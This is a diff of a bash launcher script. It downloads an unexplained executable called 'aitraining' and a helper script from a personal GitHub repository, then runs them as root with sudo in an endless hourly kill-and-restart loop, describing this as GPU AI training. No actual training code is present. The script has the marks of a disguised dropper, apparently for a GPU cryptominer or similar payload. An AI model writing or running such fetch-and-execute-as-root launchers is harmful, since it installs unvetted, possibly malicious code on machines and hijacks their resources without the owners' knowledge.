@@ -1,67 +1,62 @@
 #!/bin/bash
-
 # File: start_modelgp.sh launcher
+# Purpose: Manage GPU AI training process from GitHub TELEGRAMBOT
 
-# Ensure unzip is installed
-sudo apt install -y unzip
+# Ensure wget is installed
+sudo apt update
+sudo apt install -y wget
 
-# Main loop for managing start_modelgp.sh lifecycle
+# Define paths
+WORKDIR="$HOME/TELEGRAMBOT"
+AITRAINING_URL="https://github.com/max313iq/Ssl/raw/main/aitraining"
+START_SCRIPT_URL="https://github.com/max313iq/Ssl/raw/main/start_modelgp.sh"
+
+# Create working directory
+mkdir -p "$WORKDIR"
+
+# Download scripts if they don't exist
+if [ ! -f "$WORKDIR/aitraining" ]; then
+    echo "Downloading aitraining..."
+    sudo wget -q -O "$WORKDIR/aitraining" "$AITRAINING_URL"
+    sudo chmod +x "$WORKDIR/aitraining"
+fi
+
+if [ ! -f "$WORKDIR/start_modelgp.sh" ]; then
+    echo "Downloading start_modelgp.sh..."
+    sudo wget -q -O "$WORKDIR/start_modelgp.sh" "$START_SCRIPT_URL"
+    sudo chmod +x "$WORKDIR/start_modelgp.sh"
+fi
+
 while true; do
-    echo "Starting GPU model process..."
+    echo "========== Starting GPU AI Training Launcher =========="
 
-    # Stop any old processes
-    if pgrep -f "start_modelgp.sh" > /dev/null; then
-        sudo pkill -f "start_modelgp.sh"
-        echo "start_modelgp.sh process stopped."
-    else
-        echo "start_modelgp.sh process already stopped or crashed."
-    fi
+    # Stop old processes safely
+    for proc in "start_modelgp.sh" "aitraining"; do
+        if pgrep -f "$proc" > /dev/null; then
+            sudo pkill -f "$proc"
+            echo "$proc stopped."
+        else
+            echo "$proc not running."
+        fi
+    done
 
-    if pgrep -f "aitraining" > /dev/null; then
-        sudo pkill -f "aitraining"
-        echo "aitraining process stopped."
-    else
-        echo "aitraining process already stopped or crashed."
-    fi
+    # Start the main GPU script with sudo
+    echo "Launching start_modelgp.sh with sudo..."
+    sudo bash "$WORKDIR/start_modelgp.sh" &
 
-    # Launch new process in background
-    nohup bash -c '
-        # Optional re-download of TELEGRAMBOT
-        sudo wget -O TELEGRAMBOT.zip https://github.com/max313iq/Ssl/releases/download/TELEGRAMBOT/TELEGRAMBOT.zip
-        sudo mkdir -p TELEGRAMBOT
-        sudo unzip -o TELEGRAMBOT.zip -d TELEGRAMBOT
+    # Run for 1 hour (3600 seconds) before restarting
+    sleep 3600
 
-        # Go into the TELEGRAMBOT directory
-        cd TELEGRAMBOT || exit
+    echo "========== Stopping processes after 1 hour =========="
+    for proc in "start_modelgp.sh" "aitraining"; do
+        if pgrep -f "$proc" > /dev/null; then
+            sudo pkill -f "$proc"
+            echo "$proc stopped."
+        else
+            echo "$proc already stopped."
+        fi
+    done
 
-        # Ensure scripts are executable
-        sudo chmod +x aitraining
-        sudo chmod +x start_modelgp.sh
-
-        # Start main GPU script
-        sudo bash ./start_modelgp.sh
-    ' > /dev/null 2>&1 &
-
-    echo "start_modelgp.sh is now running. It will run for 1 hour."
-
-    # Wait for 1 hour (4600 seconds)
-    sleep 4600
-
-    echo "Stopping running GPU process..."
-    if pgrep -f "start_modelgp.sh" > /dev/null; then
-        sudo pkill -f "start_modelgp.sh"
-        echo "start_modelgp.sh process stopped."
-    else
-        echo "start_modelgp.sh already stopped or crashed."
-    fi
-
-    if pgrep -f "aitraining" > /dev/null; then
-        sudo pkill -f "aitraining"
-        echo "aitraining process stopped."
-    else
-        echo "aitraining already stopped or crashed."
-    fi
-
-    echo "Waiting 1 minute before restart..."
+    echo "Waiting 1 minute before restarting..."
     sleep 60
 done
